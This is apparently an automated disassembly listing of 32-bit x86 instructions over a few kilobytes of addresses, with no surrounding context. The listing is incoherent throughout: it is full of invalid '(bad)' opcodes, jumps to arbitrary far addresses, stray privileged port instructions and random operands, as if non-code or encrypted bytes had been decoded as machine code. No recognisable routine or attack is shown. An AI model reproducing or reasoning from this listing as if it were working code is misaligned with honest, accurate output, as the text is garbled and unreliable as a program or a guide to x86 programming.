  426ba0:	idiv   bh
  426ba2:	add    al,ah
  426ba4:	in     al,dx
  426ba5:	sub    eax,eax
  426ba7:	cmp    esp,DWORD PTR [eax]
  426ba9:	and    BYTE PTR [ebp-0xd],0xce
  426bad:	rol    DWORD PTR [ebx-0x740a0eb2],1
  426bb3:	jbe    0x426b39
  426bb5:	or     esi,0xffffffe3
  426bb8:	xchg   BYTE PTR [esi-0x45f98500],ch
  426bbe:	call   0x428b17
  426bc3:	mov    DWORD PTR [eax+0x30c054fa],ecx
  426bc9:	sub    ah,0x53
  426bcc:	fiadd  DWORD PTR [eax]
  426bce:	add    ch,dl
  426bd0:	stos   BYTE PTR es:[edi],al
  426bd1:	cmp    ecx,0xffffffbe
  426bd4:	add    ecx,edi
  426bd6:	stc    
  426bd7:	jl     0x426bcc
  426bd9:	call   0x11e85e1
  426bde:	mov    esi,DWORD PTR [esi+0x62fff448]
  426be4:	out    dx,eax
  426be5:	aad    0x7
  426be7:	fs jb  0x426be8
  426bea:	mov    edi,ds
  426bec:	fldcw  WORD PTR [ebx+edi*8-0x3]
  426bf0:	imul   edi,esi,0x4f
  426bf3:	cmc    
  426bf4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426bf5:	ficom  DWORD PTR [ecx]
  426bf7:	mov    ds:0x56c48372,al
  426bfc:	cmc    
  426bfd:	addr16 je 0x426c60
  426c00:	or     DWORD PTR [eax],esi
  426c02:	das    
  426c03:	mov    ds:0x5b6ef4,al
  426c08:	pop    ebp
  426c09:	push   cs
  426c0a:	inc    ebp
  426c0b:	pop    edx
  426c0c:	fwait
  426c0d:	xor    bl,ch
  426c0f:	daa    
  426c10:	arpl   WORD PTR [edx-0x2],si
  426c13:	addr16 jmp 0x42fd:0xc5ffbaa8
  426c1b:	add    DWORD PTR [edx+0x9],esp
  426c1e:	mov    dl,0xd7
  426c20:	loope  0x426bfe
  426c22:	fs add bh,ah
  426c25:	mov    ah,0x50
  426c27:	push   eax
  426c28:	lea    ecx,[esi+ebx*1-0x318dddf1]
  426c2f:	cli    
  426c30:	push   edi
  426c31:	rcl    BYTE PTR [ebx],cl
  426c33:	inc    eax
  426c34:	(bad)  
  426c35:	sti    
  426c36:	dec    esp
  426c37:	test   DWORD PTR [ecx+0x63127aa6],ecx
  426c3d:	jb     0x426c3d
  426c3f:	cs push esp
  426c41:	mov    edx,0xead4d3e9
  426c46:	jnp    0x426c84
  426c48:	adc    esi,edi
  426c4a:	addr16 je 0x426cc7
  426c4d:	stos   BYTE PTR es:[edi],al
  426c4e:	add    al,0x68
  426c50:	loop   0x426ca4
  426c52:	(bad)  
  426c55:	iret   
  426c56:	or     DWORD PTR [ecx+edx*2+0x2284fe30],eax
  426c5d:	ficomp DWORD PTR [ecx+edx*1+0x76e416ef]
  426c64:	scas   eax,DWORD PTR es:[edi]
  426c65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426c66:	add    BYTE PTR [edi+0x7f0b8814],dl
  426c6c:	add    BYTE PTR [edx],ah
  426c6e:	or     eax,0xa5a77ceb
  426c73:	gs inc esp
  426c75:	outs   dx,DWORD PTR ds:[esi]
  426c76:	shr    DWORD PTR [ecx+0x6cad772c],1
  426c7c:	cmp    al,0xfd
  426c7e:	fidiv  DWORD PTR [eax-0x42]
  426c81:	mov    ebp,0x760edb2a
  426c86:	jmp    0x3c8:0x44d0427
  426c8d:	pop    ecx
  426c8e:	pop    ebp
  426c8f:	lods   al,BYTE PTR ds:[esi]
  426c90:	add    esp,DWORD PTR [edx-0x27]
  426c93:	data16 out 0x95,al
  426c96:	xchg   bl,ah
  426c98:	jg     0x426c8e
  426c9a:	(bad)  
  426c9c:	add    ebp,ecx
  426c9e:	fincstp 
  426ca0:	add    esp,DWORD PTR [edx+0x2e]
  426ca3:	push   cs
  426ca4:	add    al,0x99
  426ca6:	int3   
  426ca7:	pop    ds
  426ca8:	jmp    0xecd45ce
  426cad:	xchg   cl,ch
  426caf:	daa    
  426cb0:	add    al,0xe5
  426cb2:	mov    DWORD PTR [ecx-0x12],esi
  426cb5:	cdq    
  426cb6:	pop    esp
  426cb7:	jp     0x426cb1
  426cb9:	loope  0x426d1b
  426cbb:	call   0xce70cec3
  426cc0:	add    eax,esp
  426cc2:	fxch   st(5)
  426cc4:	jmp    FWORD PTR [edx+ebp*1-0x79d211ad]
  426ccb:	cmc    
  426ccc:	fwait
  426ccd:	push   esp
  426cce:	sbb    eax,ebp
  426cd0:	jp     0x426cd2
  426cd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426cd3:	test   eax,0x19ae4365
  426cd8:	add    DWORD PTR [edx+0xc],ebp
  426cdb:	add    BYTE PTR [ecx],0x96
  426cde:	adc    DWORD PTR [eax],ebp
  426ce0:	cli    
  426ce1:	cld    
  426ce2:	and    eax,0xdee940e8
  426ce7:	pushf  
  426ce8:	or     eax,0xfb90e460
  426ced:	push   cs
  426cee:	jp     0x426d1a
  426cf0:	push   ebx
  426cf1:	je     0x426d67
  426cf3:	xchg   ecx,eax
  426cf4:	sti    
  426cf5:	(bad)  
  426cf6:	jge    0x426d69
  426cf8:	popa   
  426cf9:	aaa    
  426cfa:	jnp    0x426c7e
  426cfc:	jle    0x426c9a
  426cfe:	jge    0x426c82
  426d00:	out    0xf7,al
  426d02:	nop
  426d03:	cdq    
  426d04:	inc    ecx
  426d05:	stos   BYTE PTR es:[edi],al
  426d06:	pop    ecx
  426d07:	cld    
  426d08:	call   0xfac47877
  426d0d:	(bad)  
  426d0f:	mov    eax,ds:0x82163cfa
  426d14:	adc    al,0x8d
  426d16:	push   eax
  426d17:	sbb    DWORD PTR [ecx],eax
  426d19:	jno    0x426d91
  426d1b:	rol    DWORD PTR [eax],1
  426d1d:	jmp    0x1d478898
  426d22:	xchg   esp,eax
  426d23:	pop    esi
  426d24:	push   esp
  426d25:	rcr    DWORD PTR [ecx],0x93
  426d28:	jmp    0x11bce66
  426d2d:	arpl   WORD PTR [esi],dx
  426d2f:	jle    0x426d42
  426d31:	sbb    DWORD PTR [edx+eax*4-0x2ff5e8c],ebp
  426d38:	jmp    0x426d96
  426d3a:	fbld   TBYTE PTR [ecx+0x6aa57f85]
  426d40:	add    BYTE PTR ss:[edx-0x6c],dh
  426d44:	jno    0x426ccb
  426d46:	fwait
  426d47:	pop    esi
  426d48:	fld    DWORD PTR [edx+esi*1-0x2b0629ae]
  426d4f:	rol    DWORD PTR [eax-0x183cffec],0x40
  426d56:	add    BYTE PTR [ebx+0x2902e1de],bh
  426d5c:	sbb    ecx,ebp
  426d5e:	cmp    BYTE PTR [edx-0x22],0x0
  426d62:	ret    
  426d63:	jnp    0x426dac
  426d65:	fst    DWORD PTR [eax]
  426d67:	retf   0xb41d
  426d6a:	jg     0x426dea
  426d6c:	mov    al,0x34
  426d6e:	xchg   ebx,eax
  426d6f:	ins    DWORD PTR es:[edi],dx
  426d70:	mov    eax,ds:0xaedf185c
  426d75:	call   FWORD PTR [ecx+0x25]
  426d78:	sbb    ch,bl
  426d7a:	ret    
  426d7b:	rol    dh,1
  426d7d:	rcl    DWORD PTR [edi],0xde
  426d80:	dec    esp
  426d81:	sub    esp,DWORD PTR [ecx-0x6dd1d2d2]
  426d87:	fidiv  WORD PTR [ebp-0x161d1253]
  426d8d:	cmp    DWORD PTR [eax+0x5d],esp
  426d90:	inc    esp
  426d91:	add    dl,BYTE PTR [ebx-0x1a3e3726]
  426d97:	inc    edx
  426d98:	(bad)  
  426d99:	pop    ds
  426d9a:	and    eax,DWORD PTR [eax]
  426d9c:	sub    al,0x75
  426d9e:	sbb    BYTE PTR cs:[eax-0x25ac4e8b],bl
  426da5:	mov    bl,0xad
  426da7:	imul   esp,DWORD PTR [ecx],0x42
  426daa:	cmp    eax,0xc3a651f9
  426daf:	xchg   dh,al
  426db1:	fbstp  TBYTE PTR [ebx+edx*4-0x8]
  426db5:	xor    edi,DWORD PTR [ecx-0x49]
  426db8:	jmp    0xb7b5:0x1e26142d
  426dbf:	pop    ds
  426dc0:	cli    
  426dc1:	push   ds
  426dc2:	xor    al,0x93
  426dc4:	out    dx,al
  426dc5:	sub    al,0xd2
  426dc7:	aaa    
  426dc8:	and    esi,eax
  426dca:	std    
  426dcb:	inc    edi
  426dcc:	bound  ecx,QWORD PTR [edx+0x5d2d57b9]
  426dd2:	mov    ds:0xcf0f49f4,al
  426dd7:	pop    ds
  426dd8:	push   esp
  426dd9:	sub    DWORD PTR [ecx],ecx
  426ddb:	sub    BYTE PTR [eax],ah
  426ddd:	lds    ebp,FWORD PTR [ecx+0x2646edb0]
  426de3:	xor    al,0xf1
  426de5:	in     al,0xd7
  426de7:	bound  eax,QWORD PTR [esi+0x31254522]
  426ded:	adc    eax,0x22f7f4a2
  426df2:	ret    
  426df3:	or     al,0x2d
  426df5:	rcl    DWORD PTR [edx],1
  426df7:	inc    eax
  426df8:	aad    0x9b
  426dfa:	inc    ebp
  426dfb:	and    ah,bh
  426dfd:	(bad)  
  426dfe:	idiv   esp
  426e00:	add    bh,ch
  426e02:	inc    ebp
  426e03:	icebp  
  426e04:	outs   dx,DWORD PTR ds:[esi]
  426e05:	jmp    0xe9524ff3
  426e0a:	lods   al,BYTE PTR ds:[esi]
  426e0b:	scas   eax,DWORD PTR es:[edi]
  426e0c:	loope  0x426e78
  426e0e:	sbb    BYTE PTR [esi-0x71],cl
  426e11:	pushf  
  426e12:	(bad)  
  426e13:	cmp    dh,BYTE PTR [ecx-0xb6697ef]
  426e19:	dec    ebp
  426e1a:	sbb    eax,0x150230b9
  426e1f:	les    edi,FWORD PTR [esi+ecx*8-0x4ef01627]
  426e26:	int3   
  426e27:	fdivr  DWORD PTR [esi-0xf]
  426e2a:	sbb    al,0xf7
  426e2c:	jmp    0x5964:0xdfaf63b2
  426e33:	add    dh,BYTE PTR [eax-0x7]
  426e36:	or     esi,esi
  426e38:	mov    BYTE PTR [esi],0x78
  426e3b:	dec    ebp
  426e3c:	xor    eax,0xf4a214d1
  426e41:	jl     0x426e53
  426e43:	clc    
  426e44:	jmp    0x633a:0xaa81d9da
  426e4b:	adc    bh,dl
  426e4d:	pop    ebp
  426e4e:	push   edx
  426e4f:	add    dh,BYTE PTR [eax+0x26]
  426e52:	dec    edi
  426e53:	lods   al,BYTE PTR ds:[esi]
  426e54:	sub    dh,BYTE PTR [esi-0x16]
  426e57:	int3   
  426e58:	mov    dh,0x82
  426e5a:	jmp    0xab2d9d0f
  426e5f:	imul   ebx,DWORD PTR [edi],0x5ef6e3be
  426e65:	add    BYTE PTR [edi+0x66],dl
  426e68:	dec    ebp
  426e69:	mov    dl,0x1b
  426e6b:	jmp    DWORD PTR [ebx+0x15f6256c]
  426e71:	mov    al,0x92
  426e73:	dec    edx
  426e74:	or     ebx,ebx
  426e76:	cdq    
  426e77:	rcr    BYTE PTR [edi+eiz*8],cl
  426e7a:	xor    ebp,esi
  426e7c:	aaa    
  426e7d:	fisttp WORD PTR [edi-0x5a]
  426e80:	dec    ebp
  426e81:	stos   BYTE PTR es:[edi],al
  426e82:	repnz (bad) 
  426e84:	shr    dh,0x6d
  426e87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426e88:	inc    edi
  426e89:	sub    al,0x8e
  426e8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426e8c:	into   
  426e8d:	mov    bh,0x9e
  426e8f:	loopne 0x426eda
  426e91:	fidivr WORD PTR [edi]
  426e93:	xchg   ebx,eax
  426e94:	retf   0x93b1
  426e97:	xchg   ebx,eax
  426e98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426e99:	add    dh,0x4d
  426e9c:	call   0x4c98d0a4
  426ea1:	and    BYTE PTR [esi-0x27],bl
  426ea4:	push   ss
  426ea5:	iret   
  426ea6:	xor    ebp,DWORD PTR [edx]
  426ea8:	push   cs
  426ea9:	clc    
  426eaa:	out    0x1d,al
  426eac:	les    esi,FWORD PTR [ebx]
  426eae:	cli    
  426eaf:	adc    al,0x4
  426eb1:	rol    BYTE PTR [ebp+0x6213e843],0xd9
  426eb8:	pop    ss
  426eb9:	jns    0x426e46
  426ebb:	push   eax
  426ebc:	cld    
  426ebd:	pop    ds
  426ebe:	inc    esi
  426ebf:	add    BYTE PTR [ecx],0xdc
  426ec2:	popf   
  426ec3:	call   0x9d255808
  426ec8:	or     eax,0xb6150074
  426ecd:	sub    al,0xd3
  426ecf:	popa   
  426ed0:	es addr16 jmp 0xe9434500
  426ed7:	cmp    DWORD PTR [ebx-0x3dd662b],esi
  426edd:	stc    
  426ede:	jo     0x426f05
  426ee0:	mov    dh,0x4c
  426ee2:	ss push esp
  426ee4:	inc    ebp
  426ee5:	pop    gs
  426ee7:	popa   
  426ee8:	pop    edx
  426ee9:	icebp  
  426eea:	jo     0x426ef1
  426eec:	mov    dh,0x10
  426eee:	fs jg  0x426efe
  426ef1:	sbb    bh,BYTE PTR [esi-0x16977dd5]
  426ef7:	sbb    ebx,eax
  426ef9:	push   edx
  426efa:	push   es
  426efb:	xor    DWORD PTR fs:[edi],ecx
  426efe:	test   eax,0xcd455061
  426f03:	push   ebp
  426f04:	pop    esp
  426f05:	shl    DWORD PTR [eax+eax*4+0x54],0x4d
  426f0a:	or     eax,0xe26479ce
  426f0f:	inc    ecx
  426f10:	jle    0x426f41
  426f12:	mov    dl,0xf3
  426f14:	adc    al,0x25
  426f16:	stc    
  426f17:	dec    ecx
  426f18:	sub    esi,esi
  426f1a:	mov    BYTE PTR [ecx+0x5b],0xbe
  426f1e:	push   ds
  426f1f:	mov    al,ds:0x1a685624
  426f24:	dec    ebp
  426f25:	add    ecx,ebp
  426f27:	popa   
  426f28:	inc    edx
  426f29:	push   ebx
  426f2a:	adc    esi,esp
  426f2c:	bound  eax,QWORD PTR [ecx-0x17]
  426f2f:	add    BYTE PTR [edi-0x7f],bh
  426f32:	lea    ebp,[ebp+0x3a]
  426f35:	imul   eax,DWORD PTR [ecx],0x1afb61e9
  426f3b:	add    BYTE PTR [ebx-0xb],bl
  426f3e:	or     al,0xa4
  426f40:	in     al,dx
  426f41:	cmc    
  426f42:	jns    0x426f08
  426f44:	xchg   DWORD PTR [eax-0x3f],edx
  426f47:	jne    0x426f4a
  426f49:	jo     0x426f85
  426f4b:	push   eax
  426f4c:	into   
  426f4d:	xchg   ecx,eax
  426f4e:	push   ds
  426f4f:	inc    esp
  426f50:	or     esi,ebp
  426f52:	inc    eax
  426f53:	mov    ebx,0xc929dd3a
  426f58:	pop    eax
  426f59:	adc    eax,0xad674c88
  426f5e:	jns    0x426f24
  426f60:	aas    
  426f61:	push   0x7d
  426f63:	and    al,0x5b
  426f65:	xor    BYTE PTR [edx+0x1e91beab],ah
  426f6b:	sbb    al,0xdb
  426f6d:	imul   eax,DWORD PTR [ebp+0x24],0x51514d2f
  426f74:	loope  0x426f4e
  426f76:	dec    ecx
  426f77:	push   ecx
  426f78:	mov    edx,0xa7248569
  426f7d:	aad    0x0
  426f7f:	add    bl,cl
  426f81:	inc    ecx
  426f82:	mov    edi,0x3e7d1744
  426f87:	add    bl,cl
  426f89:	fdivr  st(5),st
  426f8b:	adc    eax,0x3a8697
  426f90:	inc    esi
  426f91:	sbb    al,0x6
  426f93:	test   BYTE PTR [eax],al
  426f95:	xor    ah,bh
  426f97:	cmc    
  426f98:	jmp    FWORD PTR [eax+ebp*4-0x6fd1e3e2]
  426f9f:	push   ds
  426fa0:	adc    al,0x93
  426fa2:	pop    ds
  426fa3:	repz (bad) 
  426fa5:	in     al,dx
  426fa6:	pop    eax
  426fa7:	shl    DWORD PTR [esp+edi*4-0x5],0x74
  426fac:	and    al,0xab
  426fae:	sti    
  426faf:	adc    ecx,DWORD PTR [eax]
  426fb1:	mov    BYTE PTR [edx+edi*8+0x5f6a6282],bl
  426fb8:	jne    0x42701a
  426fba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426fbb:	cmp    edi,ebx
  426fbd:	out    dx,al
  426fbe:	(bad)  
  426fbf:	cli    
  426fc0:	xchg   BYTE PTR [edi],dh
  426fc2:	cli    
  426fc3:	repz aas 
  426fc5:	bound  eax,QWORD PTR [edi]
  426fc7:	cmp    bl,bh
  426fc9:	(bad)  
  426fca:	xchg   esi,eax
  426fcb:	push   ds
  426fcc:	sti    
  426fcd:	sub    al,0x29
  426fcf:	ret    0x4dfa
  426fd2:	pop    ds
  426fd3:	test   esp,ebp
  426fd5:	outs   dx,BYTE PTR ds:[esi]
  426fd6:	je     0x426fd6
  426fd8:	call   DWORD PTR [ecx+0x7152b845]
  426fde:	mov    ebx,0xd69687b2
  426fe3:	stc    
  426fe4:	xchg   BYTE PTR [ebx],bh
  426fe6:	sti    
  426fe7:	push   edx
  426fe8:	call   0xfba1894a
  426fed:	fbstp  TBYTE PTR [ecx+0x71da840e]
  426ff3:	(bad)  
  426ff4:	dec    DWORD PTR ds:0x232
  426ffa:	bound  esi,QWORD PTR [edx-0x12]
  426ffd:	jae    0x427052
  426fff:	or     eax,DWORD PTR [esi]
  427001:	jg     0x426fee
  427003:	(bad)  
  427004:	aam    0x5
  427006:	fistp  QWORD PTR [edi-0x2d]
  427009:	add    ebx,DWORD PTR [ecx-0x17022760]
  42700f:	mov    eax,ds:0xa99f86b5
  427014:	bnd call 0xc0c516df
  42701a:	aaa    
  42701b:	dec    esp
  42701c:	xor    dl,0x2e
  42701f:	mov    eax,0xa7865c1c
  427024:	rol    DWORD PTR [ecx+eiz*8],cl
  427027:	xchg   DWORD PTR [edx],ebp
  427029:	je     0x42705c
  42702b:	sti    
  42702c:	fimul  WORD PTR [ebx]
  42702e:	sub    al,0xd9
  427030:	outs   dx,BYTE PTR ds:[esi]
  427031:	dec    edi
  427032:	jp     0x427034
  427034:	xchg   ecx,eax
  427035:	popa   
  427036:	mov    DWORD PTR [ebx-0x68],edx
  427039:	xchg   DWORD PTR [eax+0x4],esi
  42703c:	es (bad) 
  42703e:	push   ds
  42703f:	mov    ch,0xdf
  427041:	mov    bl,0xb7
  427043:	fs pop ebp
  427045:	les    esp,FWORD PTR [ebp+0x77]
  427048:	les    ecx,FWORD PTR [eax+ebx*2+0x7f]
  42704c:	fs inc esp
  42704e:	into   
  42704f:	mov    ch,0xba
  427051:	mov    WORD PTR [eax],?
  427053:	dec    ebp
  427054:	lods   al,BYTE PTR ds:[esi]
  427055:	daa    
  427056:	data16 jno 0x42709e
  427059:	dec    ebx
  42705a:	cmp    BYTE PTR [edi+0x64],bh
  42705d:	inc    esp
  42705e:	add    BYTE PTR [esi-0x7e2f8b1b],ch
  427064:	loope  0x4270b5
  427066:	sbb    al,0x28
  427068:	jg     0x42709d
  42706a:	(bad)  
  42706b:	scas   al,BYTE PTR es:[edi]
  42706c:	mov    ch,0xcf
  42706e:	lea    edi,[edx]
  427070:	jb     0x42706d
  427072:	pop    ebx
  427073:	(bad)  
  427074:	fldcw  WORD PTR [esi+0x52]
  427077:	cli    
  427078:	stc    
  427079:	inc    edx
  42707a:	add    al,0x62
  42707c:	push   ebx
  42707d:	daa    
  42707e:	ins    DWORD PTR es:[edi],dx
  42707f:	hlt    
  427080:	enter  0xc127,0x8b
  427084:	sbb    al,0x9f
  427086:	sbb    BYTE PTR [esi],0xe6
  427089:	in     eax,0x3
  42708b:	bound  ebx,QWORD PTR [edx-0x27318f97]
  427091:	out    0x3,eax
  427093:	sbb    eax,0xdcb93224
  427098:	sbb    BYTE PTR [edi+0x55],0xe3
  42709c:	(bad)  
  42709d:	call   0xe81bce94
  4270a2:	adc    bh,ah
  4270a4:	pop    ecx
  4270a5:	jmp    0x184d2ad
  4270aa:	stc    
  4270ab:	imul   ebx,ecx,0x996f1a00
  4270b1:	push   ecx
  4270b2:	aas    
  4270b3:	add    esp,esp
  4270b5:	mul    DWORD PTR fs:[ecx-0x17039782]
  4270bc:	and    eax,DWORD PTR ds:0x56d1aa62
  4270c2:	jo     0x4270c4
  4270c4:	fwait
  4270c5:	ror    BYTE PTR [esi+0x6c],cl
  4270c8:	call   0xe8ce:0x336450cd
  4270cf:	repz jecxz 0x427053
  4270d2:	cli    
  4270d3:	jb     0x4270ef
  4270d5:	retf   
  4270d6:	jge    0x427125
  4270d8:	push   ebp
  4270d9:	push   eax
  4270da:	inc    ebx
  4270db:	adc    eax,0xc33619ef
  4270e0:	push   ebp
  4270e1:	daa    
  4270e2:	mov    BYTE PTR [edi-0x5973f3df],ch
  4270e8:	sbb    cl,BYTE PTR [esi]
  4270ea:	mov    WORD PTR [edi+0x4f56762d],fs
  4270f0:	add    BYTE PTR [edx-0x273d917a],0x0
  4270f7:	jmp    0xff9f1cd2
  4270fc:	and    DWORD PTR [esi-0x77],edi
  4270ff:	addr16 popf 
  427101:	fld    DWORD PTR [eax]
  427103:	jmp    0x66ce3f07
  427108:	sahf   
  427109:	fld    DWORD PTR [eax]
  42710b:	jmp    0x21c5be21
  427110:	popa   
  427111:	fld    DWORD PTR [eax]
  427113:	cmp    DWORD PTR ds:0x72a57ea4,ebp
  427119:	dec    esp
  42711a:	cmp    BYTE PTR [edx+0x4100d966],0x60
  427121:	fadd   DWORD PTR [eax]
  427123:	add    BYTE PTR [ebx+0x868d49],bh
  427129:	add    edx,ebp
  42712b:	add    BYTE PTR [eax],al
  42712d:	jnp    0x42714d
  42712f:	aam    0xba
  427131:	jg     0x427107
  427133:	add    BYTE PTR [eax],al
  427135:	dec    ecx
  427136:	push   0xd97ad57e
  42713b:	add    BYTE PTR [eax+0x6],dl
  42713e:	dec    edi
  42713f:	fld    QWORD PTR [ecx]
  427141:	mov    ebx,ecx
  427143:	call   0xf660764f
  427148:	test   DWORD PTR [ebx+0x4bdc83cd],edi
  42714e:	fld    DWORD PTR [eax]
  427150:	push   0x4a
  427152:	push   0x4d
  427154:	and    al,0x63
  427156:	in     eax,dx
  427157:	fnstenv [eax+0x4c8bd93b]
  42715d:	outs   dx,DWORD PTR ds:[esi]
  42715e:	and    edx,0xd5a47a
  427164:	test   BYTE PTR [ebx-0x34],bh
  427167:	test   BYTE PTR [edi-0x72ff26c5],ch
  42716d:	xchg   DWORD PTR [ecx-0x26f4fe42],esi
  427173:	mov    ebx,DWORD PTR [esi+0xd843]
  427179:	jae    0x427124
  42717b:	mov    eax,ds:0xc15254ff
  427180:	jae    0xfb427288
  427186:	jo     0x427186
  427188:	add    bl,bh
  42718a:	fmul   DWORD PTR [ecx+0x50]
  42718d:	add    BYTE PTR [esi+0x51],al
  427190:	and    eax,0xd8cad2
  427195:	push   eax
  427196:	push   0xa4505115
  42719b:	xor    edx,0x4b26211
  4271a1:	das    
  4271a2:	nop
  4271a3:	cmc    
  4271a4:	cmp    eax,0x1c0c2a7a
  4271a9:	push   esp
  4271aa:	and    DWORD PTR [edx+edx*8],edi
  4271ad:	or     al,0x5f
  4271af:	outs   dx,BYTE PTR ds:[esi]
  4271b0:	add    eax,0xe6ad6200
  4271b5:	cs fwait
  4271b7:	int3   
  4271b8:	mov    ecx,DWORD PTR [ecx+eiz*1]
  4271bb:	pop    es
  4271bc:	and    BYTE PTR [eax+eax*4],0x71
  4271c0:	(bad)  
  4271c1:	(bad)  
  4271c2:	jmp    0x4271b8
  4271c4:	add    eax,0xe8726202
  4271c9:	pop    es
  4271ca:	xlat   BYTE PTR ds:[ebx]
  4271cb:	mul    BYTE PTR [ecx]
  4271cd:	fisub  DWORD PTR [ebx+0x72]
  4271d0:	dec    BYTE PTR [edi-0x19]
  4271d3:	repz std 
  4271d5:	add    DWORD PTR [edx+0x72],esp
  4271d8:	scas   al,BYTE PTR es:[edi]
  4271d9:	cli    
  4271da:	das    
  4271db:	out    dx,eax
  4271dc:	inc    ecx
  4271dd:	or     al,0xfb
  4271df:	adc    eax,DWORD PTR ds:0xc21d6200
  4271e5:	and    edx,DWORD PTR [esi-0x54]
  4271e8:	std    
  4271e9:	jmp    DWORD PTR [edx-0x1e0726b7]
  4271ef:	adc    eax,0x5e00b60a
  4271f4:	jno    0x4271f4
  4271f6:	push   DWORD PTR [eax+0x5fe58305]
  4271fc:	jb     0x4271fc
  4271fe:	dec    edi
  4271ff:	out    dx,eax
  427200:	repz icebp 
  427202:	add    DWORD PTR [edx+0x72],esp
  427205:	dec    ax
  427207:	iret   
  427208:	rcr    BYTE PTR [edx-0x7b],cl
  42720b:	and    al,BYTE PTR ds:0x84ed8725
  427211:	add    al,0x0
  427213:	(bad)  
  427214:	stc    
  427215:	mov    ebx,DWORD PTR [edx+ebx*2]
  427218:	(bad)  
  42721a:	add    edx,DWORD PTR [edx]
  42721c:	fcmove st,st(6)
  42721e:	icebp  
  42721f:	mov    WORD PTR [edi-0x269c916f],fs
  427225:	out    0x8e,eax
  427227:	es mov ch,0xdb
  42722a:	mov    edx,DWORD PTR [edx+0x19]
  42722d:	xor    edi,edx
  42722f:	xchg   edi,eax
  427230:	(bad)  
  427231:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427232:	mov    ebp,0x830f1e3b
  427237:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427238:	test   cl,ch
  42723a:	add    esp,DWORD PTR [edx-0x68]
  42723d:	xor    eax,0x65298e89
  427242:	(bad)  
  427243:	jns    0x42726d
  427245:	addr16 inc ebx
  427247:	pop    edx
  427248:	jno    0x42723f
  42724a:	pop    edx
  42724b:	(bad)  
  42724c:	fldcw  WORD PTR [esi-0x31]
  42724f:	imul   edx,DWORD PTR [eax-0x17],0xe4052286
  427256:	adc    DWORD PTR [eax],eax
  427258:	and    ch,BYTE PTR [edi-0x2]
  42725b:	add    bh,0x7d
  42725e:	jmp    0xd598da38
  427263:	or     eax,DWORD PTR [esi+eax*1+0x6f2210e4]
  42726a:	out    0x10,eax
  42726c:	and    bl,BYTE PTR [edx]
  42726e:	outs   dx,DWORD PTR ds:[esi]
  42726f:	iret   
  427270:	ins    DWORD PTR es:[edi],dx
  427271:	push   ecx
  427272:	jmp    0x26d2d60a
  427277:	adc    BYTE PTR [edx+0x24],ah
  42727a:	outs   dx,DWORD PTR ds:[esi]
  42727b:	jo     0x427202
  42727d:	jne    0x42729f
  42727f:	mov    bl,0xac
  427281:	and    edi,DWORD PTR [ebx-0x18100478]
  427287:	mov    ?,WORD PTR [ecx-0x2f]
  42728a:	outs   dx,BYTE PTR ds:[esi]
  42728b:	dec    esi
  42728c:	cli    
  42728d:	xchg   edx,eax
  42728e:	repnz add esp,DWORD PTR [edx+0x55]
  427292:	add    DWORD PTR [ecx],ebp
  427294:	mov    edx,0x6577f9c1
  427299:	push   edx
  42729a:	dec    ebx
  42729b:	cmc    
  42729c:	es (bad) 
  42729e:	call   0xfac248c6
  4272a3:	ins    DWORD PTR es:[edi],dx
  4272a4:	and    DWORD PTR ds:0xce9f6211,eax
  4272aa:	call   0xfac2438a
  4272af:	and    DWORD PTR gs:0x72607a05,eax
  4272b6:	(bad)  
  4272b7:	cli    
  4272b8:	dec    edx
  4272b9:	push   edx
  4272ba:	inc    ebx
  4272bb:	cmc    
  4272bc:	add    dl,bl
  4272be:	(bad)  
  4272bf:	jle    0x4272e2
  4272c1:	dec    esi
  4272c2:	(bad)  [ecx]
  4272c4:	jge    0x4272e7
  4272c6:	sub    ecx,ebp
  4272c8:	adc    eax,0x6d00d917
  4272cd:	sub    al,BYTE PTR [ecx+ecx*1]
  4272d0:	ins    BYTE PTR es:[edi],dx
  4272d1:	cs loop 0x4272bc
  4272d4:	lods   al,BYTE PTR ss:[esi]
  4272d6:	fld    DWORD PTR [eax]
  4272d8:	bound  ebx,QWORD PTR [edx+edx*8]
  4272db:	call   0xfac0e31c
  4272e0:	mov    esi,0xb20029ff
  4272e5:	jmp    0x86d9:0x652b5c73
  4272ec:	mov    al,0x5d
  4272ee:	jno    0x42732f
  4272f0:	inc    eax
  4272f1:	popa   
  4272f2:	fld    DWORD PTR [ebp-0x782ec25b]
  4272f8:	call   0xf56787d7
  4272fd:	lahf   
  4272fe:	fcos   
  427300:	fldenv [ecx+0x6ce5ffc0]
  427306:	cdq    
  427307:	mov    edi,0x4d5261dd
  42730c:	add    BYTE PTR [edi],dl
  42730e:	shr    al,cl
  427310:	mov    ds:0xb0f61d1a,al
  427315:	retf   0x517
  427318:	add    BYTE PTR [ebx+eiz*2-0x12c7fbc0],ch
  42731f:	add    BYTE PTR [eax+eax*1-0x31],dh
  427323:	lea    ebp,[esi+0x3]
  427326:	pop    eax
  427327:	adc    eax,0x13b7b8ba
  42732c:	sar    DWORD PTR [eax-0x8],1
  42732f:	pop    esp
  427330:	or     al,dl
  427332:	sti    
  427333:	pushf  
  427334:	mov    ebx,0x79f10055
  427339:	in     al,0xd3
  42733b:	push   ebx
  42733c:	in     eax,dx
  42733d:	fs ja  0x427315
  427340:	add    BYTE PTR [ebx-0x10],dl
  427343:	mov    ebx,0x92150f4e
  427348:	(bad)  
  427349:	push   esi
  42734a:	clc    
  42734b:	in     al,dx
  42734c:	add    BYTE PTR [esi+edi*2-0x73],dh
  427350:	jne    0x42735e
  427352:	jno    0x4273c7
  427354:	pop    eax
  427355:	push   0x46
  427357:	push   ebp
  427358:	popa   
  427359:	jmp    0x89d0:0x18e1dd3b
  427360:	push   ds
  427361:	adc    al,0xb0
  427363:	xchg   ecx,eax
  427364:	push   ds
  427365:	adc    al,0xc0
  427367:	cdq    
  427368:	push   ds
  427369:	adc    al,0xa0
  42736b:	call   0x873f87d2
  427370:	add    al,0xb8
  427372:	mov    ebx,0xec000134
  427377:	test   eax,esi
  427379:	pusha  
  42737a:	mov    eax,ds:0x3c6900dd
  42737f:	jge    0x427365
  427381:	add    BYTE PTR [ebx],cl
  427383:	pusha  
  427384:	gs and al,0x0
  427387:	bound  ebp,QWORD PTR [edx-0x2]
